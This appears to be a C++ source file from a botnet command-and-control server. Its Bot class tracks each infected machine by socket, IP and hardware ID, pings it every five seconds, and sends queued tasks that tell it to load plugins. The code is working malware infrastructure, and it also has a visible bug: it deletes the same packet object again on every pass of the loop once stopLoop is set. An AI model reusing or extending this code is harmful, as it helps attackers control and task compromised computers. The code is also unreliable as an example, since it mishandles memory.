#include "Bot.h"

bool Bot::isSuccessResponse(char *Payload) {
  return Variable::getInstance()->compareSignature(Variable::Signature::RESPONSE_SUCCESS,
                                    Payload);
}

void Bot::loopingThread() {
  Packet *RequestPacket = new Packet(this->BotSocket);
  while (true) {
    if (!stopLoop) {
      RequestPacket->clear();
      if (this->TaskQueue.empty()) {
        RequestPacket->setSignature(Variable::Signature::PING);
      } else {
        Task *task = TaskQueue.front();
        TaskQueue.pop();

        RequestPacket->clear();
        RequestPacket->setSignature(Variable::Signature::LOAD_PLUGIN);
        std::vector<char *> Params{
            task->getTaskParam_1(),
            task->getTaskParam_2(),
            task->getTaskParam_3(),
            task->getTaskParam_4(),
        };
        RequestPacket->addParam(Params);
      }

      if (RequestPacket->sendPacket()) {
        RequestPacket->receivePacket();
        if (RequestPacket->parseSignatureFromPayload() ==
            Variable::Signature::RESPONSE_SUCCESS) {
        } else {
          delete RequestPacket;
          break;
        }
      } else {
        delete RequestPacket;
        break;
      }

      Sleep(5000);
    } else {
      delete RequestPacket;
    }
  }
  BotHandler::getInstance()->removeBot(&this->HWID);
}

void Bot::startLooping() {
  LoopingThread = std::thread(&Bot::loopingThread, this);
  LoopingThread.detach();
}

SOCKET *Bot::getBotSocket() { return &this->BotSocket; }

std::string Bot::getBotIP() { return this->BotIP; }

std::string Bot::getHWID() { return this->HWID; }

void Bot::addTaskQueue(class Task *NewTask) { this->TaskQueue.push(NewTask); }